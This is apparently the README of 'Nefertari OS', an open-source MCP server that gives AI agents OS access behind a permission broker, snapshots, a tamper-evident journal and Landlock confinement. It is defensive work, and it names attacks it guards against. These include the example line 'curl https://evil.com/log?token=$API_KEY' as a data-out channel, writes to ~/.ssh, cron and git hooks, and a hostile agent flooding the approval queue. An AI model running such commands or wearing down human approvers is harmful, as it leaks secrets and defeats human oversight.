# Nefertari OS

**A system layer built for the agent as caller, not the human as caller.** The agent is not an app — it is a first-class citizen of the machine: full OS access at intent-speed, a live world it doesn’t rediscover every turn, forkable time, and continuity (self-wake, journal, deltas) — without dumping the whole machine into the prompt.

> Status: early prototype — `agentd` + broker + timeline/plan/trajectories.
> Runs wherever Docker runs: enforcement is real **inside the container**, so macOS and Windows get it
> through Docker Desktop, not just Linux natively (verified at Landlock ABI 3, unprivileged, no seccomp
> exemption). Any MCP client drives it — Claude Code, Codex, Hermes Agent, ania, your own loop.  
> Numbers: [docs/BENCHMARK.md](docs/BENCHMARK.md) — measured on cheap models, verdict read from the filesystem.  
> Thesis: [docs/VISION.md](docs/VISION.md) · Proportionality: [docs/PROPORTIONALITY.md](docs/PROPORTIONALITY.md) · Neural tissue (NexusDB/Hebbian): [docs/NEURAL-LAYER-NEXUSDB.md](docs/NEURAL-LAYER-NEXUSDB.md)

## The thesis

Every OS assumes its caller has persistent memory, near-zero cost per action, and always-on eyes. An AI agent is the exact opposite: amnesia every session, an expensive model inference per tool call, and vision limited to what it asks for. That mismatch taxes every autonomous run — re-orientation probes, one model turn per step, recomputation, single-path trial-and-error. Multiply it by a **team of agents** on one host and the taxes compound.

Nefertari is the layer that removes those taxes (see [docs/PERFORMANCE-TRACK.md](docs/PERFORMANCE-TRACK.md)):

1. **Time as a primitive** — checkpoint a working tree, **fork it into K isolated copies** (one per strategy, or one per team member), run them in parallel, **promote** the winner. Exploration stops being sequential.
2. **Execution at the level of intent** — submit a plan, get one consolidated result inside a transaction, instead of paying one model turn per step.
3. **A machine that knows itself** (next) — typed system state and session-over-session deltas instead of 20 probe commands.

**Security is the parallel track, powered by the same machinery.** Every write is snapshotted and undoable; nothing irreversible happens without a human gate — not as a convention the AI is asked to respect, but as physics (broker + kernel enforcement); everything lands in an append-only journal. For **embodied / robotic agents** — where the world itself cannot be snapshotted — the same primitives invert: fork the world *model*, not the world, and ask the broker *before* actuating (preflight, on the roadmap).

## Architecture (phase 1)

```
┌────────────────────────────┐
│  Any MCP client            │  Claude Code, ania, Team AI executor…
│  (the "brain")             │
└────────────┬───────────────┘
             │ MCP (stdio)
┌────────────▼───────────────┐
│  agentd                    │  packages/agentd
│  ┌──────────────────────┐  │
│  │ permission broker    │  │  classifies: reversible / noisy / irreversible
│  ├──────────────────────┤  │
│  │ snapshot engine      │  │  pluggable: file-copy (anywhere) → btrfs → nix
│  ├──────────────────────┤  │
│  │ journal (append-only)│  │  ~/.nefertari/journal.jsonl
│  └──────────────────────┘  │
└────────────┬───────────────┘
             │
      Linux host: WSL2 · container (Railway) · VM · bare metal
```

The same `agentd` runs unmodified on:
- **WSL2** (primary dev target — desktop companion for Windows comes in phase 2)
- **Containers** (Railway, Docker) — headless mode, snapshot backend = file-copy or overlay
- **Any Linux** (VM, bare metal) — snapshot backend = btrfs/ZFS when available

## Action classes

| Class | Examples | Broker decision |
|---|---|---|
| `reversible` | read file, write file (snapshotted), restart service, redirect to `/dev/null` | pass |
| `noisy` | install package, open port | pass + notify |
| `irreversible` | delete outside snapshot, send data out, spend money, unknown shell command, write to a sensitive path | **human approval required** |

Unknown = irreversible. The safe default is not "trust the AI", it's "prove reversibility or ask".

### What the broker specifically catches

The shell classifier is defense-in-depth: a global danger scan over the raw
string (command/process substitution, `eval`, pipe-into-interpreter, output
redirect to a real file/device) runs *before* a per-segment allowlist where the
whole is only as safe as its weakest segment. On top of that, phase-1 hardening
closed the obvious escape routes:

- **Data-out over plain GET.** `curl`/`wget` with exfil flags (`-d`, `-F`, `-o`,
  POST…) was already gated; now a *plain GET with a query string* to a
  non-allowlisted host is gated too — `curl https://evil.com/log?token=$API_KEY`
  is a data-out channel even without POST. Trusted hosts go in
  `NEFERTARI_NET_ALLOW` (comma-separated); a query to those stays reversible.
- **Writes to sensitive paths.** `fs_write`/`fs_delete` to shell startup files,
  cron, systemd units, `~/.ssh`, sudoers/pam.d, or code-exec config
  (`.gitconfig`, `.git/hooks`, `.npmrc`) are irreversible even though they are
  snapshotted — the effect can fire before anyone gets to undo it.
- **Approval-queue flood.** At most `NEFERTARI_MAX_PENDING` (default 25) distinct
  irreversible actions can wait at once; past the cap new ones are refused
  outright, so a hostile agent can't bury a human in prompts until they
  rubber-stamp one (approval fatigue).
- **No-op redirects don't nag.** A redirect whose only target is `/dev/null`
  (or `/dev/stdout`/`/dev/stderr`) is a no-op, so `command -v gh 2>/dev/null`
  stays reversible instead of being gated as a "write".

## Time as a primitive: checkpoint · fork · promote

The performance headline (see [docs/PERFORMANCE-TRACK.md](docs/PERFORMANCE-TRACK.md)):
the agent can branch the state of its working tree the way it branches its own
reasoning. `snapshots` undo one action; `timeline` makes whole-tree state forkable.

| Tool | What it does | Class |
|---|---|---|
| `timeline_checkpoint` | copy a directory tree into the timeline store (`node_modules` excluded by default, size guard `NEFERTARI_TIMELINE_MAX_MB`) | reversible |
| `timeline_fork` | materialize **K isolated working copies** of a checkpoint — one per strategy, or one per team member | reversible |
| `timeline_promote` | the winning fork's content becomes the working dir (current state auto-checkpointed first) | noisy |
| `timeline_restore` | put the working dir back to a checkpoint (auto-checkpointed first, so restore is itself undoable) | noisy |
| `timeline_list` | list checkpoints and forks | reversible |

The team pattern: checkpoint once → fork ×N → each teammate works its own fork in
parallel (no trampling, no serialization) → evaluate → promote the best → the
losers cost nothing to throw away. Excluded dirs are left untouched by restores;
every restore/promote is undoable via its automatic safety checkpoint. Backend is
plain file copy (runs anywhere); the interface is stable for CoW backends
(btrfs/ZFS/overlayfs) later.

## Execution at the level of intent: `plan_run`

The round-trip tax is the dominant cost of a long-horizon agent: one model turn
per tool call. `plan_run` inverts it — the agent submits a whole plan (an ordered
list of `fs_read`/`fs_write`/`fs_delete`/`shell` steps) and agentd executes it in
**one call, inside a timeline transaction**:

- the dir is checkpointed before step 1 (transaction boundary; shell steps
  default their cwd to it, so enforcement confines their writes to it);
- any failing step → the dir is **restored atomically** — and the failed state is
  itself auto-checkpointed first, so it stays inspectable for forensics;
- the plan is classified as the **worst of its steps**, so a plan containing one
  irreversible step parks at the human gate *before step 1 runs* — no partial
  execution up to a wall. `undo`, `timeline_*` and nested `plan_run` are not
  allowed inside a plan;
- the journal records the plan and each step (`plan` + `step` fields).

A 30-step procedure costs 1 model turn instead of 30. The single tools and the
plan steps share one implementation (`src/ops.mjs`) — same snapshotting, same
kernel enforcement, whichever door the action comes through.

Steps take the shape a model finds easiest to emit — flat, no `args` object to
nest — and the array may arrive as a JSON string, which is what stringifying
models send:

```json
[{"tool":"fs_write","path":"src/app.js","content":"…"},
 {"tool":"shell","command":"npm test"}]
```

The older `{"tool":…,"args":{…}}` form still works. This is not cosmetic: three
levels of nesting is where cheap models fail, and a primitive only a flagship
model can address is not a primitive. A refusal names the step, the tool and the
missing field, so the next turn fixes it instead of guessing again.

Plans are **fork-portable**: relative fs paths resolve inside the plan's dir and
cannot escape it (an escape rolls the plan back). That's what makes the next
primitive possible — the same plan can run against a fork whose path the caller
never sees.

## Speculative trajectories: `trajectories_run`

Timeline (fork ×K) + plan executor = the single-path tax dies. Instead of
try A → fail → backtrack → try B, the agent submits **K alternative plans in one
call**; agentd forks the checkpoint K ways and runs every strategy **in
parallel, each in its own isolated world**:

- each trajectory is transactional (its own `runPlan` on its own fork): a failing
  strategy rolls back to the checkpoint content and never poisons the others;
- an optional `eval_cmd` runs in each *completed* fork (cwd = the fork, exit 0 =
  pass); the first passing trajectory is recommended as **winner** — one
  `timeline_promote` adopts it, the losers cost nothing to throw away;
- classification composes worst-wins across **all** plans *and* the eval command,
  so one irreversible step anywhere parks the whole call at the gate **before any
  fork exists**;
- shell steps run with cwd = their fork, so kernel enforcement write-confines each
  strategy to its own world — the security track composes for free (K ≤ 8).

For an AI team this *is* the org chart: checkpoint once, one fork per teammate,
`eval_cmd` as the acceptance test, promote = merge review. For a single agent
it's speculative execution: explore the whole frontier in one model turn.

## Kernel-enforced reversibility (pluggable)

The broker's verdict is only as good as the process that respects it. To make
"reversible" *physics* rather than *policy*, reversible shell commands run
confined so their writes can only land in the working dir (+ `/tmp` + `/dev/null`)
— a command the classifier *believed* was read-only literally cannot write
elsewhere. Everything else on the filesystem stays read/execute.

**Which mechanism does the confining is a driver — the core stays vendor-neutral.**
This is deliberate: Nefertari does not depend on any one vendor's sandbox.

| `NEFERTARI_ENFORCE_DRIVER` | Backend | Dependency |
|---|---|---|
| `landlock` *(default)* | our own `nefertari-enforce` Rust binary ([Landlock](https://docs.kernel.org/userspace-api/landlock.html) ABI 3, kernel ≥ 5.13, no root) | **none** — zero external dep |
| `landrun` | community [`landrun`](https://github.com/Zouuup/landrun) (Landlock v5, incl. network rules) | `landrun` on PATH |
| `custom` | **any** sandboxer — firejail, bubblewrap, Anthropic `sandbox-runtime`… | wired purely via env |
| `null` | no confinement (fail-open) | — |

The built-in default is a ~330 KB Rust wrapper that `execve`s the command so the
Landlock restriction is inherited and cannot be dropped:

```bash
cd packages/enforce && cargo build --release
export NEFERTARI_ENFORCE_BIN=$PWD/target/release/nefertari-enforce   # agentd auto-detects it
```

The container image carries that binary already, so `docker compose up` is enforced out of the box.
Do not take the claim on trust — the test writes inside the allowlist, writes outside it, and then
reads the filesystem to see which one landed:

```bash
bash packages/agentd/test/enforce-docker.sh
```

Landlock confines **writes**, which is what reversibility needs; it is not confidentiality, and
ABI 3 carries no network rules. An egress boundary is the broker's job, or the `landrun` driver's.

The `custom` driver is the agnostic escape hatch — plug in any tool without
touching code:

```bash
export NEFERTARI_ENFORCE_DRIVER=custom
export NEFERTARI_ENFORCE_CUSTOM_BIN=firejail
export NEFERTARI_ENFORCE_CUSTOM_PREARGS='["--quiet","--private-tmp"]'
export NEFERTARI_ENFORCE_CUSTOM_WRITE_FLAG=--whitelist   # repeated per writable path
# → firejail --quiet --private-tmp --whitelist <cwd> --whitelist /tmp -- bash -lc "<cmd>"
```

Proven on the WSL2 kernel (6.6, Landlock ABI 3): a reversible command that tries
to write outside its working dir gets `EACCES` **from the kernel**, while the
same write inside the dir succeeds (`packages/agentd/test/enforce.mjs`). This
binds the reversibility verdict to enforcement — agentic frameworks classify;
Nefertari classifies *and* the kernel holds the line. Honest scope: Landlock ABI
3 confines **writes** (reversibility), not confidentiality or network egress —
egress stays the broker's job (use the `landrun`/`custom` drivers if you need
kernel-level network rules too). If the selected driver is unavailable, agentd
fails open to plain `bash` unless `NEFERTARI_ENFORCE=1` forces fail-closed.

## Driving it from your own loop

Nothing here is specific to one client. `agentd` is an MCP server over stdio, so
anything that speaks MCP is already a caller: Claude Code, Codex, Hermes Agent,
`langchain-mcp-adapters`, or forty lines of your own.

The shortest complete example is not a snippet in this file — it is
[`examples/bench-on-nefertari.mjs`](packages/agentd/examples/bench-on-nefertari.mjs),
which connects with the plain MCP SDK, converts the tool list into
OpenAI-shaped function definitions, and drives any `/v1/chat/completions`
endpoint round the loop. It is not illustrative code: it is what produces
[the benchmark numbers](docs/BENCHMARK.md), so it is exercised end to end every
time they are reproduced, against three different models.

Deliberately not included: a framework-specific example nobody here has run.
An example that does not work costs more trust than it buys.

## What else is in here

Four things that are not primitives but that the primitives turned out to need.

**The context boundary.** Everything an agent reads is sent to a third-party API
on its next turn, so the context IS the exfiltration channel — by construction,
not by attack. The enforceable point is not the outbound call, which `agentd`
never sees, but what enters the context: `fs_read` and shell output are screened,
and a secret the agent never saw cannot be forwarded by it. Credential shapes are
masked by pattern always; a **local** model judges the sensitivity patterns
cannot describe, because asking a remote model whether something may leave would
be sending it. `NEFERTARI_EGRESS=redact|warn|refuse|off`.

**A journal that can be a witness.** When the caller is human, the record is
corroborated by the human: they testify. An agent cannot. So entries are
hash-chained — editing, deleting, reordering or inserting one breaks the chain at
a line `journal_verify` names. Tamper-evident, not tamper-proof: a signature and
an external anchor are what close that, and both build on this.

**`working_set`.** The journal already records every file read, written and
deleted. Replayed, it is the answer a resuming session actually needs — not
"what is here" but **what moved while I was gone**: a file whose mtime is newer
than the last action recorded against it was changed by someone else, and that
is where a stale assumption is about to cost a wrong edit.

**The inference window.** After every tool call the machine does nothing for
seconds while the model thinks — measured at 99–100% of a multi-step run, and
`agentd` is the only process that sees both edges of it. The checkpoint's copy is
made there instead: **103ms cold, 9ms prepared**. A pre-built copy is adopted per
file only where that file's mtime is strictly older than the moment the pre-build
began; everything else is copied for real. A speculative optimisation must never
be able to produce a wrong answer, only a useless one.

Each degrades to nothing on hosts that cannot support it — cgroups need Linux and
a delegated subtree, the local model is optional — and says so rather than
pretending.

## Quick start

```bash
cd packages/agentd
npm install
node src/server.mjs          # starts the MCP server on stdio
```

Register it in any MCP client (e.g. Claude Code):

```bash
claude mcp add nefertari -- node /path/to/packages/agentd/src/server.mjs
```

### Docker (headless, any host / Railway)

A public image runs the headless approval API in a non-root container:

```bash
docker pull ghcr.io/xquantumtech/nefertari-agentd:latest
docker run -d -p 7343:7343 \
  -e NEFERTARI_TOKEN=$(openssl rand -hex 16) \
  -v nefertari-data:/data \
  ghcr.io/xquantumtech/nefertari-agentd:latest
# health: curl localhost:7343/health   ·   approve: POST /pending/:id/approve (Bearer)
```

`docker-compose.yml` and `railway.json` are in `packages/agentd`. On Railway,
set the service **Root Directory** to `packages/agentd` and it builds the
Dockerfile directly. The image is published by CI
(`.github/workflows/docker-publish.yml`) on every push to `main`.

Human gate CLI:

```bash
node src/cli.mjs pending             # list actions waiting for approval
node src/cli.mjs approve <id>        # approve one
node src/cli.mjs journal 20          # tail the journal
node src/cli.mjs undo <snapshot_id>  # restore a snapshot
node src/cli.mjs serve               # headless approval API (containers/Railway):
                                     #   GET /pending · POST /pending/:id/approve|deny
                                     #   Bearer token in ~/.nefertari/token or NEFERTARI_TOKEN
```

## Windows companion (phase 2, block 1)

If agentd runs in WSL2, you approve from Windows — no shell into WSL needed.
`packages/companion-win/nefertari-companion.ps1` (zero deps, PowerShell 5.1):

```powershell
.\nefertari-companion.ps1                 # watch: toast on every new pending + keys 1-9 / A / D
.\nefertari-companion.ps1 -Once           # list pending and exit
.\nefertari-companion.ps1 -Approve <id>   # approve
.\nefertari-companion.ps1 -Deny <id>      # deny
.\nefertari-companion.ps1 -Journal 20     # tail the audit journal
```

The companion never reimplements gate logic: it shells into agentd's own CLI
inside WSL, so there is exactly one approval implementation.

## Real-model tests

`examples/ania-on-nefertari.mjs` connects a live LLM (any OpenAI-compatible
endpoint) to agentd over MCP and gives it a sysadmin task whose only path is an
irreversible action. Verified with kat-coder-pro-v2.5 on AtlasCloud: the model
works normally through reversible tools, hits the gate on `rm -rf`, and stops —
with the data physically untouched on disk.

`examples/team-ai-on-nefertari.mjs` goes further: a Fortuna **Team AI ops
executor** (same kat-coder brain) is told to install the GitHub CLI and clone a
repo. On a real run it did 7 reversible/read actions — 3 of the 5 shell runs
confined by Landlock — and had 6 acquisition steps (`apt-get update/install`,
`curl … -o`, a `curl | dd` keyring import) stopped at the human gate. It
recognised each `pending_approval` as expected and did not try to bypass it. Run
it with `examples/run-atlas-teamai.sh` (reads the Atlas key from a local `.env`;
no secret ever touches a command line).

## Roadmap

- **Phase 1** (done): agentd + broker + journal + snapshots, MCP over stdio.
  Hardened: sensitive-path gating, GET-query exfil + net allowlist, approval-queue
  cap, `/dev/null` no-op redirects. Tests: red-team 63/63, smoke 23/23, HTTP 6/6,
  enforce (live Landlock proof), real-model + Team AI runs. Public Docker image + CI.
- **Phase 2a** (done) — time & intent: ✅ timeline checkpoint/fork/restore/promote,
  ✅ `plan_run`, ✅ `trajectories_run`. Parallel: ✅ Landlock enforce, ✅ Windows
  companion approve toasts.
- **Phase 2b–e** (next) — **body + fusion + affordable autonomy** (see VISION):
  - body contract with Ania (no dual-path host mutation)
  - live world-model + typed state + `assert_outcome` (T4–T6)
  - **self-wake bus** (timer/event/gate/dependency) + skinny resume packets (T7)
  - **proportional host tiers** T0–T4 + progressive disclosure (T8)
  - `preflight` for embodied/robotic agents
  - companion UI Automation eyes/hands; NixOS-WSL; CoW backends
- **Phase 3**: desktop control (AT-SPI / UIA / AXUIElement), local model routing, voice,
  agent-as-systemd-citizen install profile.

## License

[MIT](LICENSE). Use it, fork it, ship it inside something commercial — no reciprocity clause and
nothing to ask permission for. A system layer earns its place by being adopted, and a licence that
makes a company's lawyer stop and think is a licence that stops adoption.
